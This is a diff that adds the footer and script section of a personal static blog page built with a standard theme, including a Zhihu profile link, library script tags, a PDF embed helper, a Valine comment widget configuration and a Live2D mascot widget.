+      <span class="links-of-author-item">
+        <a href="https://www.zhihu.com/people/pluto-9-55" title="ZhiHu → https:&#x2F;&#x2F;www.zhihu.com&#x2F;people&#x2F;pluto-9-55" rel="noopener" target="_blank"><i class="fab fa-zhihu fa-fw"></i>ZhiHu</a>
+      </span>
+  </div>
+
+
+<!-- CloudCalendar -->
+<div class="widget-wrap" style="width: 90%;margin-left: auto;margin-right: auto; opacity: 0.97;">
+	<div class="widget" id="CloudCalendar"></div>
+</div>
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020-11-04</span>
+  <span class="with-love",id="animate">
+    <i class="fa fa-basketball-ball"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">xiaohong</span>
+</div>
+
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,0' opacity='0.5' zIndex='-1' count='150' src="/xiaohong404.github.io/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/xiaohong404.github.io/lib/anime.min.js"></script>
+  <script src="/xiaohong404.github.io/lib/velocity/velocity.min.js"></script>
+  <script src="/xiaohong404.github.io/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/xiaohong404.github.io/js/utils.js"></script>
+
+<script src="/xiaohong404.github.io/js/motion.js"></script>
+
+
+<script src="/xiaohong404.github.io/js/schemes/muse.js"></script>
+
+
+<script src="/xiaohong404.github.io/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/xiaohong404.github.io/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+<script>
+document.querySelectorAll('.pdfobject-container').forEach(element => {
+  let url = element.dataset.target;
+  let pdfOpenParams = {
+    navpanes : 0,
+    toolbar  : 0,
+    statusbar: 0,
+    pagemode : 'thumbs',
+    view     : 'FitH'
+  };
+  let pdfOpenFragment = '#' + Object.entries(pdfOpenParams).map(([key, value]) => `${key}=${encodeURIComponent(value)}`).join('&');
+  let fullURL = `/xiaohong404.github.io/lib/pdf/web/viewer.html?file=${encodeURIComponent(url)}${pdfOpenFragment}`;
+
+  if (NexT.utils.supportsPDFs()) {
+    element.innerHTML = `<embed class="pdfobject" src="${url + pdfOpenFragment}" type="application/pdf" style="height: ${element.dataset.height};">`;
+  } else {
+    element.innerHTML = `<iframe src="${fullURL}" style="height: ${element.dataset.height};" frameborder="0"></iframe>`;
+  }
+});
+</script>
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+
+  
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'qgoG1EyC6yrAnmbPcCl9pCH8-gzGzoHsz',
+      appKey     : 'yzRsxAlXtg72qlBbwrwA034j',
+      placeholder: "Just go go",
+      avatar     : 'wavatar',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : 'en,zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+
+<script src="/xiaohong404.github.io/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/xiaohong404.github.io/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":150,"height":300,"hOffset":80,"vOffset":-50},"mobile":{"show":true},"log":false,"tagMode":false});</script></body>
+</html>
